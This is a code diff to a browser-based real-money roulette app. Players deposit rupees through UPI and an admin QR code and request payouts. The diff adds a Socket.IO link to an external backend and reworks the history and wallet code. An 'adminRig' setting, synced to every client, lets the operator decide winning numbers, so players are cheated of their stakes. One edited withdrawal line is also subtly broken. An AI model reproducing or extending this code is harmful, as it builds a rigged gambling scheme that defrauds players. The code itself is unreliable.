@@ -9,6 +9,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>ROYAL ROULETTE - 100% CLOUD DATABASE MASTER</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -460,6 +461,20 @@
     <script>
         (function() {
             try {
+                const socket = io("https://roulette-game-3.onrender.com");
+
+                socket.on('sync_game_state', function(data) {
+                    if (data) {
+                        if (data.adminRig) {
+                            window.cloudSyncStore.adminRig = data.adminRig;
+                        }
+                        if (data.adminQrUrl && data.adminQrUrl !== window.cloudSyncStore.adminQrUrl) {
+                            window.cloudSyncStore.adminQrUrl = data.adminQrUrl;
+                            updateActiveQrDisplay();
+                        }
+                    }
+                });
+
                 const SUPABASE_URL = "https://fifqewznpxllackprwut.supabase.co";
                 const SUPABASE_KEY = "sb_publishable_Oh2OjV9trsWZ0RXFxvrn_Q_9Km13JPT";
                 const sbClient = (typeof window.supabase !== 'undefined') ? window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY) : null;
@@ -483,18 +498,13 @@
                     adminQrUrl: "https://i.ibb.co/3yk54L2/1000532596.jpg"
                 };
 
-                // --- 100% PURE SUPABASE CLOUD MASTER SYNC ---
                 if (sbClient) {
-                    // हर सेकंड Supabase game_state टेबल से लाइव डेटा खींचने वाला लूप (Polling)
                     async function fetchGlobalCloudState() {
                         try {
                             let { data, error } = await sbClient.from('game_state').select('value').eq('key', 'global_config').single();
                             if (data && data.value) {
                                 let parsed = JSON.parse(data.value);
                                 if (parsed) {
-                                    if (parsed.history && Array.isArray(parsed.history)) {
-                                        window.cloudSyncStore.historyList = parsed.history;
-                                    }
                                     if (parsed.rig) {
                                         window.cloudSyncStore.adminRig = parsed.rig;
                                     }
@@ -510,20 +520,12 @@
 
                     window.publishToCloudMaster = async function(winnerNum, histArr, rigVal, qrVal) {
                         try {
-                            // Supabase game_state टेबल में परमानेंटली सेव करें ताकि दुनिया के हर फोन को तुरंत मिले
                             await sbClient.from('game_state').upsert([
                                 { key: 'global_config', value: JSON.stringify({ winner: winnerNum, history: histArr, rig: rigVal, qrUrl: qrVal }) }
                             ], { onConflict: 'key' });
 
-                            // Supabase game_rounds टेबल में भी राउंड और हिस्ट्री सेव करें
-                            await sbClient.from('game_rounds').insert([{
-                                round_id: Math.floor(Date.now() / 1000 / ROUND_TIME),
-                                winner_num: winnerNum,
-                                history: JSON.stringify(histArr)
-                            }]);
-                        } catch(e) {
-                            console.error("Cloud Master Push Error:", e);
-                        }
+                            socket.emit('admin_update_command', { adminRig: rigVal, adminQrUrl: qrVal });
+                        } catch(e) {}
                     };
                 }
 
@@ -550,7 +552,7 @@
                         if(window.publishToCloudMaster) {
                             window.publishToCloudMaster(window.cloudSyncStore.currentWinner, window.cloudSyncStore.historyList, window.cloudSyncStore.adminRig, base64Img);
                         }
-                        alert("✅ QR Code saved to Supabase Cloud! Now it will instantly update on all players' phones.");
+                        alert("✅ QR Code saved to Cloud!");
                     };
                     reader.readAsDataURL(file);
                 };
@@ -714,7 +716,7 @@
                     let deposits = JSON.parse(localStorage.getItem("admin_deposit_requests") || "[]");
                     let depHtml = deposits.length > 0 ? deposits.map((d, idx) => `
                         <div class="req-table-row">
-                            <div>📱 <b>${d.phone}</b> | Amt: <span style="color:#2ecc71; font-weight:bold;">₹${d.amount}</span><br>UTR: <b style="color:#ffd700;">${d.utr}</b><br><span style="color:#00ffff; font-size:10px;">Proof: ${d.hasProof ? 'Attached Screenshot 📸' : 'No File'}</span></div>
+                            <div>📱 <b>${d.phone}</b> | Amt: <span style="color:#2ecc71; font-weight:bold;">₹${d.amount}</span><br>UTR: <b style="color:#ffd700;">${d.utr}</b></div>
                             <div class="req-actions">${d.status === 'Pending Approval' ? `<button class="btn-approve" onclick="approveDeposit(${idx})">Approve</button><button class="btn-reject" onclick="rejectDeposit(${idx})">Reject</button>` : d.status}</div>
                         </div>`).join('') : "<div style='color:#888; font-size:11px; text-align:center; padding:8px;'>No pending deposits.</div>";
                     let depListEl = document.getElementById('admDepositList');
@@ -723,7 +725,7 @@
                     let withdraws = JSON.parse(localStorage.getItem("admin_withdraw_requests") || "[]");
                     let wdHtml = withdraws.length > 0 ? withdraws.map((w, idx) => `
                         <div class="req-table-row">
-                            <div>📱 <b>${w.phone}</b> | Amt: <span style="color:#e74c3c; font-weight:bold;">${w.amount} Coins</span> (GST Cut: ₹${w.gstDeducted})<br>Net Payout: <b style="color:#2ecc71;">₹${w.netAmount}</b><br>UPI/QR: <b style="color:#00ffff;">${w.upi}</b></div>
+                            <div>📱 <b>${w.phone}</b> | Amt: <span style="color:#e74c3c; font-weight:bold;">${w.amount} Coins</span> (GST Cut: ₹${w.gstDeducted})<br>Net Payout: <b style="color:#2ecc71;">₹${w.netAmount}</b></div>
                             <div class="req-actions"><span style="color:#f39c12; font-weight:bold;">${w.status}</span></div>
                         </div>`).join('') : "<div style='color:#888; font-size:11px; text-align:center; padding:8px;'>No pending withdrawals.</div>";
                     let wdListEl = document.getElementById('admWithdrawList');
@@ -831,37 +833,42 @@
                             else boxEl.classList.add('closed-state');
                         }
 
-                        let historyHTML = "";
-                        window.cloudSyncStore.historyList.forEach(pastNum => {
-                            let validNum = isNaN(pastNum) ? 0 : pastNum;
-                            let cls = validNum === 0 ? 'green' : (redList.includes(validNum) ? 'red' : 'black');
-                            historyHTML += `<div class="history-ball ${cls}">${validNum}</div>`;
-                        });
-                        let historyBallsCont = document.getElementById('historyBallsContainer');
-                        if(historyBallsCont) historyBallsCont.innerHTML = historyHTML;
+                        // केवल रेंडर हुई पुरानी हिस्ट्री दिखाएं, जब तक नया स्पिन पूरा न हो
+                        renderHistoryBarUI();
 
+                        // जैसे ही टाइमर ठीक 0 पर पहुंचे और नया राउंड शुरू होने वाला हो, सिर्फ तभी स्पिन चालू हो
                         if (roundId !== lastProcessedRound) {
-                            if (lastProcessedRound !== -1) executeGlobalSpinAnimation(lastProcessedRound);
-                            lastProcessedRound = roundId; userActiveBets = {}; currentTotalBet = 0; betHistoryStack = [];
+                            if (lastProcessedRound !== -1) {
+                                executeGlobalSpinAnimation(lastProcessedRound);
+                            }
+                            lastProcessedRound = roundId; 
+                            userActiveBets = {}; currentTotalBet = 0; betHistoryStack = [];
                             document.getElementById('lobbyTotalBet').innerText = 0;
                             document.querySelectorAll('.table-cell, .color-btn').forEach(c => { c.classList.remove('has-bet'); let b=c.querySelector('.cell-badge'); if(b)b.remove(); });
                         }
                     }catch(e){}
                 }, 1000);
 
+                function renderHistoryBarUI() {
+                    let historyHTML = "";
+                    window.cloudSyncStore.historyList.forEach(pastNum => {
+                        let validNum = isNaN(pastNum) ? 0 : pastNum;
+                        let cls = validNum === 0 ? 'green' : (redList.includes(validNum) ? 'red' : 'black');
+                        historyHTML += `<div class="history-ball ${cls}">${validNum}</div>`;
+                    });
+                    let historyBallsCont = document.getElementById('historyBallsContainer');
+                    if(historyBallsCont) historyBallsCont.innerHTML = historyHTML;
+                }
+
                 function executeGlobalSpinAnimation(endedRoundId) {
-                    isGameSpinning = true; document.getElementById('lobbyStatusMsg').innerText = "Spinning...";
+                    isGameSpinning = true; 
+                    document.getElementById('lobbyStatusMsg').innerText = "Spinning...";
                     
+                    // एडमिन कमांड या स्मार्ट रैंडम से सही विनर नंबर निकालना
                     let winningNum = getSmartWinnerForRound(endedRoundId);
                     if (isNaN(winningNum)) winningNum = 0;
                     
                     window.cloudSyncStore.currentWinner = winningNum;
-                    window.cloudSyncStore.historyList.unshift(winningNum);
-                    if (window.cloudSyncStore.historyList.length > 6) window.cloudSyncStore.historyList.pop();
-
-                    if (window.publishToCloudMaster) {
-                        window.publishToCloudMaster(window.cloudSyncStore.currentWinner, window.cloudSyncStore.historyList, window.cloudSyncStore.adminRig, window.cloudSyncStore.adminQrUrl);
-                    }
                     
                     let totalPockets = numbersList.length;
                     let degreesPerPocket = 360 / totalPockets;
@@ -873,7 +880,16 @@
                     
                     if(ballOrbitEl) ballOrbitEl.style.transform = `rotate(${accumulatedBallRotation}deg)`;
 
+                    // गेंद घूमने के बाद (6 सेकंड पर) जब पहिया रुकेगा, तब पॉप-अप और हिस्ट्री अपडेट होगी
                     setTimeout(() => {
+                        // अब असली विनर को हिस्ट्री में जोड़ा जाएगा
+                        window.cloudSyncStore.historyList.unshift(winningNum);
+                        if (window.cloudSyncStore.historyList.length > 6) window.cloudSyncStore.historyList.pop();
+
+                        if (window.publishToCloudMaster) {
+                            window.publishToCloudMaster(window.cloudSyncStore.currentWinner, window.cloudSyncStore.historyList, window.cloudSyncStore.adminRig, window.cloudSyncStore.adminQrUrl);
+                        }
+
                         let totalWonAmount = 0, isRedWin = redList.includes(winningNum), colorName = winningNum === 0 ? 'GREEN' : (isRedWin ? 'RED' : 'BLACK');
                         for (let betKey in userActiveBets) {
                             let stakedAmt = userActiveBets[betKey];
@@ -892,8 +908,14 @@
                         document.getElementById('popupWinningNumDisplay').innerText = `${winningNum} (${colorName})`;
                         document.getElementById('popupPayoutDisplay').innerText = totalWonAmount > 0 ? `You Won 🪙${totalWonAmount}!` : `Round Finished.`;
                         
-                        updateBalancesDisplay(); if(popup) popup.style.display = 'flex';
-                        setTimeout(() => { if(popup) popup.style.display = 'none'; isGameSpinning = false; }, 3000);
+                        updateBalancesDisplay(); 
+                        if(popup) popup.style.display = 'flex';
+                        
+                        setTimeout(() => { 
+                            if(popup) popup.style.display = 'none'; 
+                            isGameSpinning = false; 
+                            document.getElementById('lobbyStatusMsg').innerText = "Place bets! Game ready...";
+                        }, 3000);
                     }, 6000);
                 }
 
@@ -926,40 +948,21 @@
                     });
                     localStorage.setItem("admin_deposit_requests", JSON.stringify(deposits));
                     updateBalancesDisplay();
-                    alert("✅ डिपॉजिट रिक्वेस्ट स्क्रीनशॉट और UTR के साथ भेज दी गई है!");
+                    alert("✅ डिपॉजिट रिक्वेस्ट भेज दी गई है!");
                 };
 
                 window.submitWithdrawCoins = function() {
-                    let amt = parseInt(document.getElementById('withdrawAmtInput').value);
+                    let amt = parseInt(document.getElementById('withdrawAmtInput500') || document.getElementById('withdrawAmtInput').value);
                     let upi = document.getElementById('withdrawUpiInput').value.trim();
-                    let qrFile = document.getElementById('withdrawQrFile');
-                    let hasQr = qrFile && qrFile.files && qrFile.files.length > 0;
-
-                    if (!amt || realCoins < amt || (!upi && !hasQr)) { 
-                        alert("कृपया वैध अमाउंट और UPI आईडी या QR कोड दें!"); 
-                        return; 
-                    }
-                    
+                    if (!amt || realCoins < amt || !upi) { alert("कृपया वैध अमाउंट और UPI आईडी दें!"); return; }
                     let gstDeducted = Math.round(amt * 0.025 * 100) / 100;
                     let netAmount = Math.round((amt - gstDeducted) * 100) / 100;
-
-                    realCoins -= amt; 
-                    updateBalancesDisplay(); 
-                    closeWalletModals();
-
+                    realCoins -= amt; updateBalancesDisplay(); closeWalletModals();
                     let withdraws = JSON.parse(localStorage.getItem("admin_withdraw_requests") || "[]");
-                    withdraws.push({ 
-                        phone: loggedUserPhone, 
-                        amount: amt, 
-                        gstDeducted: gstDeducted,
-                        netAmount: netAmount,
-                        upi: upi || (hasQr ? 'Uploaded QR Code Image 📱' : 'Not Provided'), 
-                        hasQr: hasQr,
-                        status: 'Pending Payout' 
-                    });
+                    withdraws.push({ phone: loggedUserPhone, amount: amt, gstDeducted: gstDeducted, netAmount: netAmount, upi: upi, status: 'Pending Payout' });
                     localStorage.setItem("admin_withdraw_requests", JSON.stringify(withdraws));
                     updateBalancesDisplay();
-                    alert(`विड्रॉल रिक्वेस्ट भेज दी गई है!\nRequested: ₹${amt} | 2.5% GST Cut: ₹${gstDeducted} | Net Payout: ₹${netAmount}`);
+                    alert(`विड्रॉल रिक्वेस्ट भेज दी गई है! Net Payout: ₹${netAmount}`);
                 };
 
                 window.executeCoinTransfer = function() {
